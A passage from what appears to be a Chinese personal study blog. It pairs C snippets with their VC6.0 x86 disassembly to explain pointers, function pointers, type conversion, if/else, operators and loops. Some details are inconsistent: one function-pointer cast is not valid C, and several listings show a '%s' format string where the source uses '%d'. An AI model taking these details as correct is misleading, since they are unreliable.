class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">1:        int* a;</span><br><span class="line">2:        printf(&quot;%d&quot;,*(a+0));</span><br><span class="line">0040D838   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D83B   mov         ecx,dword ptr [eax]</span><br><span class="line">0040D83D   push        ecx</span><br><span class="line">0040D83E   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D843   call        printf (00401060)</span><br><span class="line">0040D848   add         esp,8</span><br><span class="line">3:        printf(&quot;%d&quot;,a[0]);</span><br><span class="line">0040D84B   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D84E   mov         eax,dword ptr [edx]</span><br><span class="line">0040D850   push        eax</span><br><span class="line">0040D851   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D856   call        printf (00401060)</span><br><span class="line">0040D85B   add         esp,8</span><br><span class="line">4:        printf(&quot;%d&quot;,*(a+2));</span><br><span class="line">0040D85E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D861   mov         edx,dword ptr [ecx+8]</span><br><span class="line">0040D864   push        edx</span><br><span class="line">0040D865   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D86A   call        printf (00401060)</span><br><span class="line">0040D86F   add         esp,8</span><br><span class="line">5:       printf(&quot;%d&quot;,a[2]);</span><br><span class="line">0040D872   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D875   mov         ecx,dword ptr [eax+8]</span><br><span class="line">0040D878   push        ecx</span><br><span class="line">0040D879   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D87E   call        printf (00401060)</span><br><span class="line">0040D883   add         esp,8</span><br><span class="line">6:       char** b;</span><br><span class="line">7:       printf(&quot;%d&quot;,*(*(b+0)+0));</span><br><span class="line">0040D886   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D889   mov         eax,dword ptr [edx]</span><br><span class="line">0040D88B   movsx       ecx,byte ptr [eax]</span><br><span class="line">0040D88E   push        ecx</span><br><span class="line">0040D88F   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D894   call        printf (00401060)</span><br><span class="line">0040D899   add         esp,8</span><br><span class="line">8:       printf(&quot;%d&quot;,b[0][0]);</span><br><span class="line">0040D89C   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D89F   mov         eax,dword ptr [edx]</span><br><span class="line">0040D8A1   movsx       ecx,byte ptr [eax]</span><br><span class="line">0040D8A4   push        ecx</span><br><span class="line">0040D8A5   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8AA   call        printf (00401060)</span><br><span class="line">0040D8AF   add         esp,8</span><br><span class="line">9:       printf(&quot;%d&quot;,*(*(b+2)+3));</span><br><span class="line">0040D8B2   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D8B5   mov         eax,dword ptr [edx+8]</span><br><span class="line">0040D8B8   movsx       ecx,byte ptr [eax+3]</span><br><span class="line">0040D8BC   push        ecx</span><br><span class="line">0040D8BD   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8C2   call        printf (00401060)</span><br><span class="line">0040D8C7   add         esp,8</span><br><span class="line">10:       printf(&quot;%d&quot;,b[2][3]);</span><br><span class="line">0040D8CA   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D8CD   mov         eax,dword ptr [edx+8]</span><br><span class="line">0040D8D0   movsx       ecx,byte ptr [eax+3]</span><br><span class="line">0040D8D4   push        ecx</span><br><span class="line">0040D8D5   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8DA   call        printf (00401060)</span><br><span class="line">0040D8DF   add         esp,8</span><br></pre></td></tr></table></figure><h2 id="数组指针"><a href="#数组指针" class="headerlink" title="数组指针"></a>数组指针</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*p)[<span class="number">2</span>];</span><br><span class="line">    p = (<span class="built_in"><span class="keyword">int</span></span>(*)[<span class="number">2</span>])a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,**p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>*p和p的存储内容相同，但是宽度不相同。</strong></p><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>因为函数的宽度是不确定的，所以不能做++–加减整数，相减的操作。但是可以做比较大小的操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Fun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*p)(<span class="keyword">int</span>,<span class="keyword">int</span>);</span><br><span class="line">    p = (<span class="built_in"><span class="keyword">int</span></span>(*)<span class="built_in">p</span>(<span class="keyword">int</span>,<span class="keyword">int</span>))Fun;</span><br><span class="line">    p = Fun;<span class="comment">//Fun函数名里面就是地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以隐藏代码到数据区</p><p>如果在程序中定义了一个函数，那么在编译时系统就会为这个函数代码分配一段存储空间，这段存储空间的首地址称为这个函数的地址。而且函数名表示的就是这个地址。既然是地址我们就可以定义一个指针变量来存放，这个指针变量就叫作函数指针变量，简称函数指针。</p><p>函数名不能被赋值，所以我们一般调用函数指针</p><br>]]></content>
      
      
      <categories>
          
          <category> 2020年9月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[实验] c语言and汇编</title>
      <link href="/2020/09/01/c%E8%AF%AD%E8%A8%80and%E6%B1%87%E7%BC%96/"/>
      <url>/2020/09/01/c%E8%AF%AD%E8%A8%80and%E6%B1%87%E7%BC%96/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>下文是简单的c语言转换汇编，然后加了一点自己的理解。<strong>有疑惑优先写代码，反汇编看完再说。</strong>只是简单的参考，以相应环境为准。这里我用的是vc6.0的版本。</p><br><h1 id="0x01类型转换"><a href="#0x01类型转换" class="headerlink" title="0x01类型转换"></a>0x01类型转换</h1><h2 id="只存在有符号"><a href="#只存在有符号" class="headerlink" title="只存在有符号"></a>只存在有符号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1:        int a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        char b = 1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        int c = a;</span><br><span class="line">0040D423   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D426   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">4:       char d = b;</span><br><span class="line">0040D429   mov         cl,byte ptr [ebp-8]</span><br><span class="line">0040D42C   mov         byte ptr [ebp-10h],cl</span><br><span class="line">5:       c = b;</span><br><span class="line">0040D42F   movsx       edx,byte ptr [ebp-8]</span><br><span class="line">0040D433   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line">6:       d = a;</span><br><span class="line">0040D436   mov         al,byte ptr [ebp-4]</span><br><span class="line">0040D439   mov         byte ptr [ebp-10h],al</span><br><span class="line">7:       int e = a+b;</span><br><span class="line">0040D43C   movsx       ecx,byte ptr [ebp-8]</span><br><span class="line">0040D440   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D443   add         edx,ecx</span><br><span class="line">0040D445   mov         dword ptr [ebp-14h],edx</span><br></pre></td></tr></table></figure><h2 id="只存在无符号（并不是使用movzx）"><a href="#只存在无符号（并不是使用movzx）" class="headerlink" title="只存在无符号（并不是使用movzx）"></a>只存在无符号（并不是使用movzx）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1:        unsigned int a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        unsigned char b = 1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        unsigned int c = a;</span><br><span class="line">0040D423   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D426   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">4:       unsigned char d = b;</span><br><span class="line">0040D429   mov         cl,byte ptr [ebp-8]</span><br><span class="line">0040D42C   mov         byte ptr [ebp-10h],cl</span><br><span class="line">5:       c = b;</span><br><span class="line">0040D42F   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D432   and         edx,0FFh</span><br><span class="line">0040D438   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line">6:       d = a;</span><br><span class="line">0040D43B   mov         al,byte ptr [ebp-4]</span><br><span class="line">0040D43E   mov         byte ptr [ebp-10h],al</span><br><span class="line">7:       unsigned int e = a+b;</span><br><span class="line">0040D441   mov         ecx,dword ptr [ebp-8]</span><br><span class="line">0040D444   and         ecx,0FFh</span><br><span class="line">0040D44A   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D44D   add         edx,ecx</span><br><span class="line">0040D44F   mov         dword ptr [ebp-14h],edx</span><br></pre></td></tr></table></figure><h2 id="有符号和无符号都出现的情况"><a href="#有符号和无符号都出现的情况" class="headerlink" title="有符号和无符号都出现的情况"></a>有符号和无符号都出现的情况</h2><p>第一种情况（两个无符号相加）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1:        unsigned int a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        unsigned char b = 1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        int c = a;</span><br><span class="line">0040D423   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D426   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">4:       char d = b;</span><br><span class="line">0040D429   mov         cl,byte ptr [ebp-8]</span><br><span class="line">0040D42C   mov         byte ptr [ebp-10h],cl</span><br><span class="line">5:       c = b;</span><br><span class="line">0040D42F   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D432   and         edx,0FFh</span><br><span class="line">0040D438   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line">6:       d = a;</span><br><span class="line">0040D43B   mov         al,byte ptr [ebp-4]</span><br><span class="line">0040D43E   mov         byte ptr [ebp-10h],al</span><br><span class="line">7:       int e = a+b;</span><br><span class="line">0040D441   mov         ecx,dword ptr [ebp-8]</span><br><span class="line">0040D444   and         ecx,0FFh</span><br><span class="line">0040D44A   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D44D   add         edx,ecx</span><br><span class="line">0040D44F   mov         dword ptr [ebp-14h],edx</span><br></pre></td></tr></table></figure><p>第二种情况（两个有符号数相加）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1:        int a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        char b = 1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        unsigned int c = a;</span><br><span class="line">0040D423   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D426   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">4:       unsigned char d = b;</span><br><span class="line">0040D429   mov         cl,byte ptr [ebp-8]</span><br><span class="line">0040D42C   mov         byte ptr [ebp-10h],cl</span><br><span class="line">5:       c = b;</span><br><span class="line">0040D42F   movsx       edx,byte ptr [ebp-8]</span><br><span class="line">0040D433   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line">6:       d = a;</span><br><span class="line">0040D436   mov         al,byte ptr [ebp-4]</span><br><span class="line">0040D439   mov         byte ptr [ebp-10h],al</span><br><span class="line">7:       unsigned int e = a+b;</span><br><span class="line">0040D43C   movsx       ecx,byte ptr [ebp-8]</span><br><span class="line">0040D440   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D443   add         edx,ecx</span><br><span class="line">0040D445   mov         dword ptr [ebp-14h],edx</span><br></pre></td></tr></table></figure><p>第三种情况（无符号加有符号）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1:        unsigned a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        char b = 0x1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        int c = a+b;</span><br><span class="line">0040D423   movsx       eax,byte ptr [ebp-8]</span><br><span class="line">0040D427   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D42A   add         ecx,eax</span><br><span class="line">0040D42C   mov         dword ptr [ebp-0Ch],ecx</span><br></pre></td></tr></table></figure><p>第四种情况（有符号加无符号）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1:        int a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        unsigned char b = 0x1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        int c = a+b;</span><br><span class="line">0040D423   mov         eax,dword ptr [ebp-8]</span><br><span class="line">0040D426   and         eax,0FFh</span><br><span class="line">0040D42B   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D42E   add         ecx,eax</span><br><span class="line">0040D430   mov         dword ptr [ebp-0Ch],ecx</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li><strong>！！！计算机中无符号数和有符号数其实是一样的东西，主要看你把它当作什么，你想怎么输出！！！</strong></li><li>同样的宽度不会发生类型转换（不管是有符号还是无符号）；</li><li>高宽度数据类型赋值给低宽度数据类型，会直接截取低位赋值，不会发生类型转换；</li><li>低宽度类型赋值给高宽度类型，会发生类型转换（把低宽度类型转换为高宽度类型，这里有两种方法，一种是movsx，一种是用and。视频中提到的movzx并没有见到）。这时候会看低宽度类型的符号位，如果都是无符号，就使用and；如果都是有符号，就是用movsx。</li></ol><p>理解了第一句话基本上对这个就没有疑惑了，多看看代码就懂了，再不懂就写写然后反汇编看看。</p><br><h1 id="0x02-if-else"><a href="#0x02-if-else" class="headerlink" title="0x02 if else"></a>0x02 if else</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">int</span> x=<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1:        if(1)&#123;</span><br><span class="line">00410658   mov         eax,1</span><br><span class="line">0041065D   test        eax,eax</span><br><span class="line">0041065F   je          main+2Eh (0041066e)</span><br><span class="line">2:            printf(&quot;1&quot;);</span><br><span class="line">00410661   push        offset string &quot;1&quot; (00426eec)</span><br><span class="line">00410666   call        printf (00410940)</span><br><span class="line">0041066B   add         esp,4</span><br><span class="line">3:        &#125;</span><br><span class="line">4:       if(0)&#123;</span><br><span class="line">0041066E   xor         ecx,ecx</span><br><span class="line">00410670   test        ecx,ecx</span><br><span class="line">00410672   je          main+43h (00410683)</span><br><span class="line">5:           printf(&quot;0&quot;);</span><br><span class="line">00410674   push        offset string &quot;0&quot; (00426ee8)</span><br><span class="line">00410679   call        printf (00410940)</span><br><span class="line">0041067E   add         esp,4</span><br><span class="line">6:       &#125;else if(int x=2)&#123;</span><br><span class="line">00410681   jmp         main+81h (004106c1)</span><br><span class="line">00410683   mov         dword ptr [x],2</span><br><span class="line">0041068A   cmp         dword ptr [x],0</span><br><span class="line">0041068E   je          main+5Fh (0041069f)</span><br><span class="line">7:           printf(&quot;2&quot;);</span><br><span class="line">00410690   push        offset string &quot;2&quot; (00426d44)</span><br><span class="line">00410695   call        printf (00410940)</span><br><span class="line">0041069A   add         esp,4</span><br><span class="line">8:       &#125;else if(x==2)&#123;</span><br><span class="line">0041069D   jmp         main+81h (004106c1)</span><br><span class="line">0041069F   cmp         dword ptr [x],2</span><br><span class="line">004106A3   jne         main+74h (004106b4)</span><br><span class="line">9:           printf(&quot;3&quot;);</span><br><span class="line">004106A5   push        offset string &quot;3&quot; (0042602c)</span><br><span class="line">004106AA   call        printf (00410940)</span><br><span class="line">004106AF   add         esp,4</span><br><span class="line">10:       &#125;else&#123;</span><br><span class="line">004106B2   jmp         main+81h (004106c1)</span><br><span class="line">11:           printf(&quot;4&quot;);</span><br><span class="line">004106B4   push        offset string &quot;4&quot; (0042601c)</span><br><span class="line">004106B9   call        printf (00410940)</span><br><span class="line">004106BE   add         esp,4</span><br></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol><li>每个条件跳转指令要跳转的地址前面都有jmp指令（第一个条件跳转指令除外），如果没有jmp说明不是if else，是单纯的if。</li><li>这些jmp跳转的地址是一样的，都跳转到end</li><li>如果某个分支没有条件判断，则为else部分。</li></ol><br><h1 id="0x03-关系运算符"><a href="#0x03-关系运算符" class="headerlink" title="0x03 关系运算符"></a>0x03 关系运算符</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">1:        int a = 1;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],1</span><br><span class="line">2:        int b = 2;</span><br><span class="line">0040102F   mov         dword ptr [ebp-8],2</span><br><span class="line">3:        int c;</span><br><span class="line">4:       c=a==b;</span><br><span class="line">00401036   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401039   xor         ecx,ecx</span><br><span class="line">0040103B   cmp         eax,dword ptr [ebp-8]</span><br><span class="line">0040103E   sete        cl</span><br><span class="line">00401041   mov         dword ptr [ebp-0Ch],ecx</span><br><span class="line">5:       c=a!=b;</span><br><span class="line">00401044   mov         edx,dword ptr [ebp-4]</span><br><span class="line">00401047   xor         eax,eax</span><br><span class="line">00401049   cmp         edx,dword ptr [ebp-8]</span><br><span class="line">0040104C   setne       al</span><br><span class="line">0040104F   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">6:       c=a&gt;=b;</span><br><span class="line">00401052   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">00401055   xor         edx,edx</span><br><span class="line">00401057   cmp         ecx,dword ptr [ebp-8]</span><br><span class="line">0040105A   setge       dl</span><br><span class="line">0040105D   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line">7:       c=a&lt;=b;</span><br><span class="line">00401060   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401063   xor         ecx,ecx</span><br><span class="line">00401065   cmp         eax,dword ptr [ebp-8]</span><br><span class="line">00401068   setle       cl</span><br><span class="line">0040106B   mov         dword ptr [ebp-0Ch],ecx</span><br><span class="line">8:       c=a&gt;b;</span><br><span class="line">0040106E   mov         edx,dword ptr [ebp-4]</span><br><span class="line">00401071   xor         eax,eax</span><br><span class="line">00401073   cmp         edx,dword ptr [ebp-8]</span><br><span class="line">00401076   setg        al</span><br><span class="line">00401079   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">9:       c=a&lt;b;</span><br><span class="line">0040107C   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040107F   xor         edx,edx</span><br><span class="line">00401081   cmp         ecx,dword ptr [ebp-8]</span><br><span class="line">00401084   setl        dl</span><br><span class="line">00401087   mov         dword ptr [ebp-0Ch],edx</span><br></pre></td></tr></table></figure><br><h1 id="0x04-逻辑运算符"><a href="#0x04-逻辑运算符" class="headerlink" title="0x04 逻辑运算符"></a>0x04 逻辑运算符</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1:        int a = 1;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],1</span><br><span class="line">2:        int b = 2;</span><br><span class="line">0040102F   mov         dword ptr [ebp-8],2</span><br><span class="line">3:        int c = 0;</span><br><span class="line">00401036   mov         dword ptr [ebp-0Ch],0</span><br><span class="line">4:       int d;</span><br><span class="line">5:       d=(a &amp;&amp; b || c);</span><br><span class="line">0040103D   cmp         dword ptr [ebp-4],0</span><br><span class="line">00401041   je          main+39h (00401049)</span><br><span class="line">00401043   cmp         dword ptr [ebp-8],0</span><br><span class="line">00401047   jne         main+48h (00401058)</span><br><span class="line">00401049   cmp         dword ptr [ebp-0Ch],0</span><br><span class="line">0040104D   jne         main+48h (00401058)</span><br><span class="line">0040104F   mov         dword ptr [ebp-14h],0</span><br><span class="line">00401056   jmp         main+4Fh (0040105f)</span><br><span class="line">00401058   mov         dword ptr [ebp-14h],1</span><br><span class="line">0040105F   mov         eax,dword ptr [ebp-14h]</span><br><span class="line">00401062   mov         dword ptr [ebp-10h],eax</span><br><span class="line">6:       d = !d;</span><br><span class="line">00401065   xor         ecx,ecx</span><br><span class="line">00401067   cmp         dword ptr [ebp-10h],0</span><br><span class="line">0040106B   sete        cl</span><br><span class="line">0040106E   mov         dword ptr [ebp-10h],ecx</span><br></pre></td></tr></table></figure><br><h1 id="0x05循环"><a href="#0x05循环" class="headerlink" title="0x05循环"></a>0x05循环</h1><h2 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do while循环"></a>do while循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1:        int i = 1;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],1</span><br><span class="line">2:        do&#123;</span><br><span class="line">3:            printf(&quot;%d&quot;,i);</span><br><span class="line">0040102F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401032   push        eax</span><br><span class="line">00401033   push        offset string &quot;%d&quot; (0042201c)</span><br><span class="line">00401038   call        printf (0040d690)</span><br><span class="line">0040103D   add         esp,8</span><br><span class="line">4:           i++;</span><br><span class="line">00401040   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">00401043   add         ecx,1</span><br><span class="line">00401046   mov         dword ptr [ebp-4],ecx</span><br><span class="line">5:       